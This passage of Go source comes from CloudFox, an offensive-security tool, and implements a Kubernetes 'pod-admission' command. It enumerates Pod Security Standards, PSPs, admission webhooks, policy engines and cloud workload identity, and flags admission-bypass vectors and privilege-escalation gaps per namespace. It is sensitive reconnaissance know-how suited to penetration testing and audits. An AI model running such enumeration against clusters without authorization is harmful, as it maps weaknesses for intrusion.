package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/BishopFox/cloudfox/kubernetes/shared/admission"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var PodAdmissionCmd = &cobra.Command{
	Use:     "pod-admission",
	Aliases: []string{"psa", "pod-security"},
	Short:   "Analyze pod admission controllers, policies, and security enforcement",
	Long: `
Analyze all cluster pod admission configurations including:

Pod Security Standards & Policies:
  - Pod Security Standards (PSS) - enforce/warn/audit levels
  - Pod Security Policies (PSP) - deprecated but detected
  - PSS exemptions analysis

Admission Controllers:
  - Admission webhooks (mutating/validating) with selector analysis
  - ValidatingAdmissionPolicy (K8s 1.26+)
  - Policy engines (Gatekeeper, Kyverno, Kubewarden, jsPolicy, Polaris, Datree)
  - Gatekeeper mutation policies (Assign, AssignMetadata, ModifySet)
  - Policy exceptions and bypass vectors

Cloud Workload Identity (in-cluster detection):
  Detects cloud workload identity configurations from in-cluster resources.
  No --cloud-provider flag required - reads CRDs and annotations directly.

  AWS EKS:
    - Pod Identity Associations (amazon-eks-pod-identity CRDs)
    - IRSA annotations on ServiceAccounts

  GCP GKE:
    - Workload Identity annotations (iam.gke.io/gcp-service-account)
    - GCP Service Account bindings

  Azure AKS:
    - Azure Workload Identity (azure.workload.identity annotations)
    - AAD Pod Identity (AzureIdentity, AzureIdentityBinding CRDs - legacy)

Examples:
  cloudfox kubernetes pod-admission
  cloudfox kubernetes pod-admission --detailed`,
	Run: ListPodAdmission,
}

// PodSecurityCmd is an alias for backwards compatibility
var PodSecurityCmd = PodAdmissionCmd

// init() removed - detailed flag is now a global persistent flag in cli/kubernetes.go

type PodAdmissionOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t PodAdmissionOutput) TableFiles() []internal.TableFile { return t.Table }
func (t PodAdmissionOutput) LootFiles() []internal.LootFile   { return t.Loot }

// PodSecurityFinding represents comprehensive policy security analysis for a namespace
type PodSecurityFinding struct {
	// Basic Info
	Namespace string
	Age       string

	// Security Analysis
	SecurityIssues []string

	// Pod Security Standards (PSS)
	PSSEnabled        bool
	PSSEnforceLevel   string
	PSSEnforceVersion string
	PSSWarnLevel      string
	PSSWarnVersion    string
	PSSAuditLevel     string
	PSSAuditVersion   string
	PSSExemptions     []string

	// Pod Security Policy (PSP - deprecated)
	PSPEnabled           bool
	PSPCount             int
	PSPNames             []string
	ClusterHasPSP        bool
	PSPAllowsPrivileged  bool
	PSPAllowsHostNetwork bool
	PSPAllowsHostPID     bool
	PSPAllowsHostIPC     bool
	PSPAllowsHostPath    bool
	PSPDangerousCaps     []string
	PSPAllowsRunAsRoot   bool

	// Admission Control Webhooks
	MutatingWebhooks   []WebhookInfo
	ValidatingWebhooks []WebhookInfo
	WebhookCount       int

	// Dynamic Policy Engines
	GatekeeperPolicies []string
	KyvernoPolicies    []string
	PolicyEngineCount  int

	// Policy Engine Counts (for table display)
	VAPCount                     int
	GatekeeperCount              int
	GatekeeperExcludedNamespaces []string // Bypass vector - namespaces excluded from Gatekeeper
	KyvernoCount                 int
	KyvernoExceptions            int
	KubewardenCount              int
	JsPolicyCount                int
	PolarisEnabled               bool
	DatreeEnabled                bool
	GatekeeperMutationCount      int

	// PSS Exemptions (bypass vectors)
	PSSExemptNamespace      bool // Is this namespace exempt from PSS?
	PSSExemptUsers          []string
	PSSExemptRuntimeClasses []string

	// Webhook Selector Bypasses
	WebhookSelectorBypasses []string // Methods to bypass via selectors

	// Policy Engine Blocking (prevents false positives)
	PolicyEngineBlocks PolicyEngineBlocking

	// Cloud Workload Identity
	CloudIdentity CloudWorkloadIdentityInfo

	// Policy Gaps
	NoEnforcement       bool
	WeakEnforcement     bool
	PolicyGaps          []string
	EnforcementCoverage string

	// Policy Conflicts
	HasConflicts    bool
	ConflictDetails []string

	// Policy Bypass Techniques
	BypassTechniques []string

	// Attack Vectors
	AllowsPrivilegeEscalation bool
	EscalationPaths           []string

	// Recommendations
	Recommendations []string
}

// PodEnumeratedPolicy represents a unified policy entry across all tools
type PodEnumeratedPolicy struct {
	Namespace     string
	Tool          string
	Name          string
	Scope         string
	Target        string
	Type          string
	Configuration string
	Details       string
	Issues        string
}

// WebhookInfo represents webhook configuration details
type WebhookInfo struct {
	Name              string
	Type              string // mutating or validating
	FailurePolicy     string
	MatchPolicy       string
	SideEffects       string
	TimeoutSeconds    int32
	NamespaceSelector string
	HasExclusions     bool
	SecurityIssues    []string
}

// PSPAnalysis represents Pod Security Policy analysis
type PSPAnalysis struct {
	Name             string
	AllowsPrivileged bool
	AllowsHostNetwork   bool
	AllowsHostPID       bool
	AllowsHostIPC       bool
	AllowsHostPath      bool
	AllowedHostPaths    []string
	AllowedCapabilities []string
	AllowsRunAsRoot     bool
	RunAsUserRule       string
	SELinuxRule         string
	FSGroupRule         string
	SecurityIssues      []string
	DeprecationWarning  string
}

// PSSAnalysis represents Pod Security Standards analysis
type PSSAnalysis struct {
	EnforceLevel    string
	EnforceVersion  string
	WarnLevel       string
	WarnVersion     string
	AuditLevel      string
	AuditVersion    string
	IsExempt        bool
	ExemptReason    string
	NoEnforcement   bool
	WeakEnforcement bool
	SecurityIssues  []string
}

// PolicyEscalationPath represents privilege escalation via policy misconfiguration
type PolicyEscalationPath struct {
	Type      string
	Policy    string
	Steps     []string
	EndResult string
}

// CloudWorkloadIdentityInfo tracks cloud provider workload identity configurations
type CloudWorkloadIdentityInfo struct {
	// AWS EKS Pod Identity
	AWSPodIdentityCount       int
	AWSPodIdentityAssociations []AWSPodIdentityAssociation

	// GCP Workload Identity
	GCPWorkloadIdentityEnabled bool
	GCPWorkloadIdentityCount   int
	GCPServiceAccounts         []GCPWorkloadIdentityBinding

	// Azure Workload Identity
	AzureWorkloadIdentityCount int
	AzureIdentities            []AzureWorkloadIdentity
}

// AWSPodIdentityAssociation represents AWS EKS Pod Identity Association
type AWSPodIdentityAssociation struct {
	Name             string
	Namespace        string
	ServiceAccount   string
	RoleARN          string
	HasWildcard      bool // Security concern if SA name is "*"
}

// GCPWorkloadIdentityBinding represents GCP Workload Identity configuration
type GCPWorkloadIdentityBinding struct {
	Name               string
	Namespace          string
	KSAName            string // Kubernetes Service Account
	GSAEmail           string // GCP Service Account email
	AnnotationPresent  bool
}

// AzureWorkloadIdentity represents Azure Workload Identity (AAD Pod Identity)
type AzureWorkloadIdentity struct {
	Name             string
	Namespace        string
	Kind             string // AzureIdentity, AzureIdentityBinding, ServiceAccount (federated)
	ClientID         string
	TenantID         string
	Selector         string
	HasFederated     bool // New federated identity vs legacy AAD Pod Identity
}

// ValidatingAdmissionPolicyInfo represents a ValidatingAdmissionPolicy (K8s 1.26+)
type ValidatingAdmissionPolicyInfo struct {
	Name             string
	FailurePolicy    string
	MatchResources   string
	Validations      int
	AuditAnnotations int
	ParamKind        string
	Bindings         []string
	// CEL expressions for blocking detection
	CELExpressions []string
}

// GatekeeperConstraintInfo represents an OPA Gatekeeper constraint
type GatekeeperConstraintInfo struct {
	Name              string
	Kind              string // The constraint template kind
	EnforcementAction string // deny, dryrun, warn
	Match             string // What resources it matches
	Violations        int
	Parameters        map[string]interface{}
	// Rego content from the associated ConstraintTemplate (for blocking detection)
	RegoContent string
}

// GatekeeperTemplateInfo represents an OPA Gatekeeper ConstraintTemplate
type GatekeeperTemplateInfo struct {
	Name        string
	Kind        string // The CRD kind it creates
	Description string
	Targets     []string
	// Rego policy code for content-based blocking detection
	RegoContent string
}

// KyvernoPolicyInfo represents a Kyverno policy
type KyvernoPolicyInfo struct {
	Name              string
	Namespace         string // empty for ClusterPolicy
	IsClusterPolicy   bool
	ValidationFailure string // enforce, audit
	Background        bool
	Rules             int
	RuleNames         []string
	// Rule patterns for blocking detection (extracted from validate.pattern and validate.deny)
	RulePatterns []string
}

// KyvernoExceptionInfo represents a Kyverno PolicyException (bypass vector!)
type KyvernoExceptionInfo struct {
	Name      string
	Namespace string
	Policies  []string // Which policies are exempted
	Rules     []string // Which rules are exempted
	Match     string   // What resources are exempted
}

// KubewardenPolicyInfo represents a Kubewarden policy
type KubewardenPolicyInfo struct {
	Name            string
	Namespace       string // empty for ClusterAdmissionPolicy
	IsClusterPolicy bool
	Module          string // The WASM module URL
	Mode            string // protect, monitor
	Mutating        bool
	Rules           string
	// Settings for content-based blocking detection (JSON stringified)
	Settings string
}

// GatekeeperConfigInfo represents Gatekeeper Config with namespace exclusions
type GatekeeperConfigInfo struct {
	Name               string
	ExcludedNamespaces []string
	ExemptImages       []string
}

// JsPolicyInfo represents a jsPolicy policy
type JsPolicyInfo struct {
	Name            string
	Namespace       string // empty for ClusterJsPolicy
	IsClusterPolicy bool
	Type            string // Validating, Mutating, Controller
	Operations      []string
	Resources       []string
	ViolationPolicy string // deny, warn
	// JavaScript/TypeScript code for content-based blocking detection
	JavaScriptCode string
}

// PolarisConfigInfo represents Polaris configuration
type PolarisConfigInfo struct {
	WebhookEnabled bool
	ConfigMap      string
	Namespace      string
	Checks         int
	Exemptions     int
	// Specific check configurations for content-based blocking detection
	PrivilegedCheckEnabled   bool
	HostNetworkCheckEnabled  bool
	HostPIDCheckEnabled      bool
	HostIPCCheckEnabled      bool
	CapabilitiesCheckEnabled bool
	RunAsRootCheckEnabled    bool
	HostPathCheckEnabled     bool
	// Raw config for additional parsing
	ConfigContent string
	ImageVerified bool // True if Polaris controller image was verified
}

// DatreeConfigInfo represents Datree webhook configuration
type DatreeConfigInfo struct {
	WebhookEnabled bool
	WebhookName    string
	// Specific check configurations for content-based blocking detection
	PrivilegedCheckEnabled   bool
	HostNetworkCheckEnabled  bool
	HostPIDCheckEnabled      bool
	HostIPCCheckEnabled      bool
	CapabilitiesCheckEnabled bool
	RunAsRootCheckEnabled    bool
	HostPathCheckEnabled     bool
	// Raw config content for additional parsing
	ConfigContent string
	ImageVerified bool // True if Datree controller image was verified
}

// PSSExemptionInfo represents PSS exemptions from AdmissionConfiguration
type PSSExemptionInfo struct {
	ExemptUsernames      []string
	ExemptRuntimeClasses []string
	ExemptNamespaces     []string
}

// GatekeeperMutationInfo represents Gatekeeper mutation policies
type GatekeeperMutationInfo struct {
	Name       string
	Kind       string // Assign, AssignMetadata, ModifySet
	Location   string // What field is being mutated
	Parameters string
	Match      string
}

// WebhookSelectorInfo represents detailed webhook selector analysis
type WebhookSelectorInfo struct {
	WebhookName       string
	Type              string // mutating, validating
	NamespaceSelector string
	ObjectSelector    string
	ExcludedLabels    []string
	MatchLabels       map[string]string
	BypassMethod      string
}

// verifyPodAdmissionImage checks if an image matches known patterns for the specified engine
// Now uses the shared admission SDK for centralized engine detection
func verifyPodAdmissionImage(image string, engine string) bool {
	return admission.VerifyControllerImage(image, engine)
}

// PolicyEngineBlocking tracks which dangerous capabilities are blocked by policy engines
// This prevents false positives when PSS is not configured but policy engines enforce restrictions
type PolicyEngineBlocking struct {
	PrivilegedBlocked      bool
	PrivilegedBlockedBy    []string
	HostPathBlocked        bool
	HostPathBlockedBy      []string
	HostNetworkBlocked     bool
	HostNetworkBlockedBy   []string
	HostPIDBlocked         bool
	HostPIDBlockedBy       []string
	HostIPCBlocked         bool
	HostIPCBlockedBy       []string
	DangerousCapsBlocked   bool
	DangerousCapsBlockedBy []string
	RunAsRootBlocked       bool
	RunAsRootBlockedBy     []string
}

func ListPodAdmission(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")
	detailed := globals.K8sDetailed

	logger.InfoM(fmt.Sprintf("Analyzing pod security policies for %s", globals.ClusterName), globals.K8S_POD_SECURITY_MODULE_NAME)

	clientset := config.GetClientOrExit()
	dynClient := config.GetDynamicClientOrExit()

	// Detect cluster-wide PSP
	clusterHasPSP := false
	pspAnalyses := analyzePSPs(ctx, dynClient)
	if len(pspAnalyses) > 0 {
		clusterHasPSP = true
	}

	// Get namespaces
	namespaces := shared.GetTargetNamespaces(ctx, clientset, &logger, globals.K8S_POD_SECURITY_MODULE_NAME)

	// Analyze webhooks
	mutatingWebhooks := analyzeWebhooks(ctx, dynClient, "mutatingwebhookconfigurations")
	validatingWebhooks := analyzeWebhooks(ctx, dynClient, "validatingwebhookconfigurations")

	// Analyze ValidatingAdmissionPolicy (K8s 1.26+)
	vapPolicies := analyzeValidatingAdmissionPolicies(ctx, dynClient)

	// Analyze OPA Gatekeeper
	gatekeeperTemplates, gatekeeperConstraints := analyzeGatekeeperConstraints(ctx, dynClient)

	// Analyze Kyverno
	kyvernoPolicies, kyvernoExceptions := analyzeKyvernoPolicies(ctx, dynClient)

	// Analyze Kubewarden
	kubewardenPolicies := analyzeKubewardenPolicies(ctx, dynClient)

	// Analyze Gatekeeper Config (namespace exclusions - bypass vector)
	gatekeeperConfig := analyzeGatekeeperConfig(ctx, dynClient)

	// Analyze jsPolicy
	jsPolicies := analyzeJsPolicies(ctx, dynClient)

	// Analyze Polaris
	polarisConfig := analyzePolarisConfig(ctx, clientset, dynClient)

	// Analyze Datree
	datreeConfig := analyzeDatreeConfig(ctx, clientset, dynClient)

	// Analyze Cloud Workload Identity (AWS, GCP, Azure)
	logger.InfoM("Analyzing cloud workload identity configurations...", globals.K8S_POD_SECURITY_MODULE_NAME)
	awsPodIdentities := analyzeAWSPodIdentity(ctx, dynClient)
	gcpWorkloadIdentities := analyzeGCPWorkloadIdentity(ctx, clientset)
	azureWorkloadIdentities := analyzeAzureWorkloadIdentity(ctx, dynClient)

	// Analyze Gatekeeper Mutation policies (Assign, AssignMetadata, ModifySet)
	gatekeeperMutations := analyzeGatekeeperMutation(ctx, dynClient)

	// Analyze webhook selectors for bypass opportunities
	webhookSelectors := analyzeWebhookSelectors(ctx, dynClient)

	// Analyze PSS exemptions (from namespace annotations or cluster config)
	pssExemptions := analyzePSSExemptions(ctx, clientset)

	// Analyze Capsule tenant pod policies
	logger.InfoM("Analyzing Capsule tenant pod policies...", globals.K8S_POD_SECURITY_MODULE_NAME)
	capsuleTenantPodPolicies := analyzeCapsuleTenantPodPolicies(ctx, dynClient)

	// Analyze Rancher project pod policies
	logger.InfoM("Analyzing Rancher project pod policies...", globals.K8S_POD_SECURITY_MODULE_NAME)
	rancherProjectPodPolicies := analyzeRancherProjectPodPolicies(ctx, dynClient)

	// Log multitenancy pod policy findings
	if len(capsuleTenantPodPolicies) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d Capsule tenant pod policies", len(capsuleTenantPodPolicies)), globals.K8S_POD_SECURITY_MODULE_NAME)
	}
	if len(rancherProjectPodPolicies) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d Rancher project pod policies", len(rancherProjectPodPolicies)), globals.K8S_POD_SECURITY_MODULE_NAME)
	}

	// Detect policy engine blocking for dangerous capabilities (prevents false positives)
	policyEngineBlocking := detectPolicyEngineBlocking(
		gatekeeperConstraints, kyvernoPolicies, vapPolicies, kubewardenPolicies,
		jsPolicies, polarisConfig, datreeConfig,
	)

	// Legacy dynamic policy detection (for backwards compatibility)
	_ = gatekeeperTemplates // used for detail table

	// Process each namespace
	var findings []PodSecurityFinding

	for _, ns := range namespaces {
		// Get namespace object to access labels and metadata
		nsObj, err := clientset.CoreV1().Namespaces().Get(ctx, ns, metav1.GetOptions{})
		if err != nil {
			shared.LogGetError(&logger, "namespace", ns, err, globals.K8S_POD_SECURITY_MODULE_NAME, false)
			continue
		}

		finding := PodSecurityFinding{
			Namespace:     ns,
			ClusterHasPSP: clusterHasPSP,
		}

		// Calculate age
		age := time.Since(nsObj.CreationTimestamp.Time)
		finding.Age = podSecurityFormatDuration(age)

		// PSS Analysis
		pssAnalysis := analyzePodSecurityStandards(*nsObj)
		finding.PSSEnabled = !pssAnalysis.NoEnforcement
		finding.PSSEnforceLevel = pssAnalysis.EnforceLevel
		finding.PSSEnforceVersion = pssAnalysis.EnforceVersion
		finding.PSSWarnLevel = pssAnalysis.WarnLevel
		finding.PSSWarnVersion = pssAnalysis.WarnVersion
		finding.PSSAuditLevel = pssAnalysis.AuditLevel
		finding.PSSAuditVersion = pssAnalysis.AuditVersion
		finding.NoEnforcement = pssAnalysis.NoEnforcement
		finding.WeakEnforcement = pssAnalysis.WeakEnforcement
		finding.SecurityIssues = append(finding.SecurityIssues, pssAnalysis.SecurityIssues...)

		// PSP Analysis
		if clusterHasPSP {
			finding.PSPEnabled = true
			finding.PSPCount = len(pspAnalyses)
			for _, psp := range pspAnalyses {
				finding.PSPNames = append(finding.PSPNames, psp.Name)
				if psp.AllowsPrivileged {
					finding.PSPAllowsPrivileged = true
				}
				if psp.AllowsHostNetwork {
					finding.PSPAllowsHostNetwork = true
				}
				if psp.AllowsHostPID {
					finding.PSPAllowsHostPID = true
				}
				if psp.AllowsHostIPC {
					finding.PSPAllowsHostIPC = true
				}
				if psp.AllowsHostPath {
					finding.PSPAllowsHostPath = true
				}
				finding.PSPDangerousCaps = append(finding.PSPDangerousCaps, psp.AllowedCapabilities...)
				if psp.AllowsRunAsRoot {
					finding.PSPAllowsRunAsRoot = true
				}
			}
			finding.SecurityIssues = append(finding.SecurityIssues,
				"PSP is deprecated since Kubernetes 1.21 and removed in 1.25 - migrate to PSS")
		}

		// Webhook Analysis
		finding.MutatingWebhooks = filterWebhooksForNamespace(mutatingWebhooks, ns, nsObj.Labels)
		finding.ValidatingWebhooks = filterWebhooksForNamespace(validatingWebhooks, ns, nsObj.Labels)
		finding.WebhookCount = len(finding.MutatingWebhooks) + len(finding.ValidatingWebhooks)

		for _, wh := range finding.MutatingWebhooks {
			finding.SecurityIssues = append(finding.SecurityIssues, wh.SecurityIssues...)
		}
		for _, wh := range finding.ValidatingWebhooks {
			finding.SecurityIssues = append(finding.SecurityIssues, wh.SecurityIssues...)
		}

		// Policy Engine Counts
		finding.VAPCount = len(vapPolicies)
		finding.GatekeeperCount = len(gatekeeperConstraints)
		finding.GatekeeperExcludedNamespaces = gatekeeperConfig.ExcludedNamespaces
		finding.KyvernoCount = len(kyvernoPolicies)
		finding.KyvernoExceptions = len(kyvernoExceptions)
		finding.KubewardenCount = len(kubewardenPolicies)
		finding.JsPolicyCount = len(jsPolicies)
		finding.PolarisEnabled = polarisConfig.WebhookEnabled
		finding.DatreeEnabled = datreeConfig.WebhookEnabled
		finding.PolicyEngineCount = finding.VAPCount + finding.GatekeeperCount + finding.KyvernoCount + finding.KubewardenCount + finding.JsPolicyCount
		if finding.PolarisEnabled {
			finding.PolicyEngineCount++
		}
		if finding.DatreeEnabled {
			finding.PolicyEngineCount++
		}

		// Gatekeeper Mutation count
		finding.GatekeeperMutationCount = len(gatekeeperMutations)

		// Policy Engine Blocking (for accurate column display)
		finding.PolicyEngineBlocks = policyEngineBlocking

		// Cloud Workload Identity (filtered by namespace)
		finding.CloudIdentity = CloudWorkloadIdentityInfo{
			AWSPodIdentityCount:        len(filterAWSPodIdentitiesByNamespace(awsPodIdentities, ns)),
			AWSPodIdentityAssociations: filterAWSPodIdentitiesByNamespace(awsPodIdentities, ns),
			GCPWorkloadIdentityCount:   len(filterGCPWorkloadIdentitiesByNamespace(gcpWorkloadIdentities, ns)),
			GCPServiceAccounts:         filterGCPWorkloadIdentitiesByNamespace(gcpWorkloadIdentities, ns),
			AzureWorkloadIdentityCount: len(filterAzureWorkloadIdentitiesByNamespace(azureWorkloadIdentities, ns)),
			AzureIdentities:            filterAzureWorkloadIdentitiesByNamespace(azureWorkloadIdentities, ns),
		}
		// Check if any GCP workload identity is enabled
		if len(finding.CloudIdentity.GCPServiceAccounts) > 0 {
			finding.CloudIdentity.GCPWorkloadIdentityEnabled = true
		}

		// PSS Exemptions check
		for _, exemptNs := range pssExemptions.ExemptNamespaces {
			if exemptNs == ns {
				finding.PSSExemptNamespace = true
				finding.SecurityIssues = append(finding.SecurityIssues,
					"Namespace is exempt from PSS enforcement")
				break
			}
		}
		finding.PSSExemptUsers = pssExemptions.ExemptUsernames
		finding.PSSExemptRuntimeClasses = pssExemptions.ExemptRuntimeClasses

		// Webhook selector bypasses
		for _, ws := range webhookSelectors {
			if ws.BypassMethod != "" {
				finding.WebhookSelectorBypasses = append(finding.WebhookSelectorBypasses, ws.BypassMethod)
			}
		}

		// Policy Gap Detection
		finding.PolicyGaps = detectPolicyGaps(finding)
		if finding.NoEnforcement {
			finding.EnforcementCoverage = "None"
		} else if finding.WeakEnforcement {
			finding.EnforcementCoverage = "Weak"
		} else {
			finding.EnforcementCoverage = "Strong"
		}

		// Policy Conflict Detection
		finding.ConflictDetails = detectPolicyConflicts(finding)
		finding.HasConflicts = len(finding.ConflictDetails) > 0

		// Policy Bypass Detection
		finding.BypassTechniques = detectPolicyBypass(finding)

		// Escalation Path Detection
		finding.EscalationPaths = detectPolicyEscalationPaths(finding, pspAnalyses)
		finding.AllowsPrivilegeEscalation = len(finding.EscalationPaths) > 0

		// Recommendations removed (offensive security tool)
		// finding.Recommendations = generatePolicyRecommendations(finding)

		findings = append(findings, finding)
	}

	// Generate output - Main table: Namespace Security Summary
	headers := []string{
		"Namespace",
		"PSS Enforce",
		"PSS Warn",
		"PSS Audit",
		"PSP Enabled",
		"Privileged",
		"HostPath",
		"HostNetwork",
		"HostPID",
		"Dangerous Caps",
		"Webhooks",
		"Webhook Bypass",
		"Policy Engines",
		"Policy Exceptions",
		"Age",
	}

	// Uniform header for all detailed policy tables
	// Schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	uniformPolicyHeader := []string{
		"Namespace",
		"Name",
		"Scope",
		"Target",
		"Type",
		"Configuration",
		"Details",
		"Issues",
	}

	// All detailed tables use uniform schema
	webhookHeaders := uniformPolicyHeader
	pspHeaders := uniformPolicyHeader
	vapHeaders := uniformPolicyHeader
	gatekeeperHeaders := uniformPolicyHeader
	kyvernoHeaders := uniformPolicyHeader
	kyvernoExceptionHeaders := uniformPolicyHeader
	kubewardenHeaders := uniformPolicyHeader
	jsPolicyHeaders := uniformPolicyHeader
	gatekeeperExclusionHeaders := uniformPolicyHeader
	polarisHeaders := uniformPolicyHeader
	datreeHeaders := uniformPolicyHeader
	awsPodIdentityHeaders := uniformPolicyHeader
	gcpWorkloadIdentityHeaders := uniformPolicyHeader
	azureWorkloadIdentityHeaders := uniformPolicyHeader
	capsuleTenantPodHeaders := uniformPolicyHeader
	rancherProjectPodHeaders := uniformPolicyHeader

	var outputRows [][]string
	var webhookRows [][]string
	var pspRows [][]string
	var vapRows [][]string
	var gatekeeperRows [][]string
	var gatekeeperExclusionRows [][]string
	var kyvernoRows [][]string
	var kyvernoExceptionRows [][]string
	var kubewardenRows [][]string
	var jsPolicyRows [][]string
	var polarisRows [][]string
	var datreeRows [][]string
	var awsPodIdentityRows [][]string
	var gcpWorkloadIdentityRows [][]string
	var azureWorkloadIdentityRows [][]string
	var capsuleTenantPodRows [][]string
	var rancherProjectPodRows [][]string
	loot := shared.NewLootBuilder()

	// Initialize single unified loot section
	loot.Section("pod-admission").SetHeader(`#####################################
##### Pod Admission Controls
#####################################
#
# Comprehensive pod admission analysis including:
# - Pod Security Standards (PSS)
# - Pod Security Policies (PSP - deprecated)
# - Admission Webhooks
# - ValidatingAdmissionPolicy (VAP)
# - Policy Engines (Gatekeeper, Kyverno, Kubewarden, jsPolicy, Polaris, Datree)
#
# This file contains enumeration commands for detected tools only.
#`)

	if globals.KubeContext != "" {
		loot.Section("pod-admission").Addf("kubectl config use-context %s\n", globals.KubeContext)
	}

	for _, finding := range findings {
		// PSS Enforce
		pssEnforce := finding.PSSEnforceLevel
		if pssEnforce == "" {
			pssEnforce = "<NONE>"
		}

		// PSS Warn
		pssWarn := finding.PSSWarnLevel
		if pssWarn == "" {
			pssWarn = "<NONE>"
		}

		// PSS Audit
		pssAudit := finding.PSSAuditLevel
		if pssAudit == "" {
			pssAudit = "<NONE>"
		}

		// PSP Enabled
		pspEnabled := "No"
		if finding.ClusterHasPSP {
			pspEnabled = "Yes"
		}

		// Privileged allowed - check all blocking sources to avoid false positives
		// Priority: Policy Engine > PSS > PSP > No Enforcement
		privilegedAllowed := "Yes"
		if finding.PolicyEngineBlocks.PrivilegedBlocked {
			privilegedAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.PrivilegedBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			privilegedAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsPrivileged {
			privilegedAllowed = "No"
		}

		// HostPath allowed - blocked by baseline and restricted
		hostPathAllowed := "Yes"
		if finding.PolicyEngineBlocks.HostPathBlocked {
			hostPathAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.HostPathBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			hostPathAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsHostPath {
			hostPathAllowed = "No"
		}

		// HostNetwork allowed - blocked by baseline and restricted
		hostNetworkAllowed := "Yes"
		if finding.PolicyEngineBlocks.HostNetworkBlocked {
			hostNetworkAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.HostNetworkBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			hostNetworkAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsHostNetwork {
			hostNetworkAllowed = "No"
		}

		// HostPID allowed - blocked by baseline and restricted
		hostPIDAllowed := "Yes"
		if finding.PolicyEngineBlocks.HostPIDBlocked {
			hostPIDAllowed = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.HostPIDBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "baseline" || finding.PSSEnforceLevel == "restricted" {
			hostPIDAllowed = "Blocked by PSS:" + finding.PSSEnforceLevel
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" && !finding.PSPAllowsHostPID {
			hostPIDAllowed = "No"
		}

		// Dangerous Caps - show actual caps or blocked status
		// Note: baseline blocks some caps, restricted blocks more
		dangerousCaps := "ALL (no restriction)"
		if finding.PolicyEngineBlocks.DangerousCapsBlocked {
			dangerousCaps = "Blocked by " + strings.Join(finding.PolicyEngineBlocks.DangerousCapsBlockedBy, ", ")
		} else if finding.PSSEnforceLevel == "restricted" {
			dangerousCaps = "Blocked by PSS:restricted"
		} else if finding.PSSEnforceLevel == "baseline" {
			dangerousCaps = "Limited by PSS:baseline"
		} else if len(finding.PSPDangerousCaps) > 0 {
			dangerousCaps = strings.Join(finding.PSPDangerousCaps, ", ")
		} else if !finding.NoEnforcement && finding.PSSEnforceLevel != "privileged" {
			dangerousCaps = "No"
		}

		// Webhook bypass - show webhooks with Ignore failure policy
		webhookBypass := "<NONE>"
		var bypassReasons []string
		for _, wh := range finding.MutatingWebhooks {
			if wh.FailurePolicy == "Ignore" {
				bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
			}
		}
		for _, wh := range finding.ValidatingWebhooks {
			if wh.FailurePolicy == "Ignore" {
				bypassReasons = append(bypassReasons, fmt.Sprintf("%s (failurePolicy:Ignore)", wh.Name))
			}
		}
		if len(bypassReasons) > 0 {
			webhookBypass = strings.Join(bypassReasons, ", ")
		}

		// Policy Engines - consolidated column
		var policyEngines []string
		if finding.VAPCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("VAP (%d)", finding.VAPCount))
		}
		if finding.GatekeeperCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("Gatekeeper (%d)", finding.GatekeeperCount))
		}
		if finding.KyvernoCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("Kyverno (%d)", finding.KyvernoCount))
		}
		if finding.KubewardenCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("Kubewarden (%d)", finding.KubewardenCount))
		}
		if finding.JsPolicyCount > 0 {
			policyEngines = append(policyEngines, fmt.Sprintf("jsPolicy (%d)", finding.JsPolicyCount))
		}
		if finding.PolarisEnabled {
			policyEngines = append(policyEngines, "Polaris")
		}
		if finding.DatreeEnabled {
			policyEngines = append(policyEngines, "Datree")
		}
		policyEnginesStr := "<NONE>"
		if len(policyEngines) > 0 {
			policyEnginesStr = strings.Join(policyEngines, ", ")
		}

		// Policy Exceptions - bypass vectors
		var policyExceptions []string
		if len(finding.GatekeeperExcludedNamespaces) > 0 {
			// Check if current namespace is in the excluded list
			for _, excludedNs := range finding.GatekeeperExcludedNamespaces {
				if excludedNs == finding.Namespace {
					policyExceptions = append(policyExceptions, "Gatekeeper (ns excluded)")
					break
				}
			}
		}
		if finding.KyvernoExceptions > 0 {
			policyExceptions = append(policyExceptions, fmt.Sprintf("Kyverno (%d)", finding.KyvernoExceptions))
		}
		policyExceptionsStr := "<NONE>"
		if len(policyExceptions) > 0 {
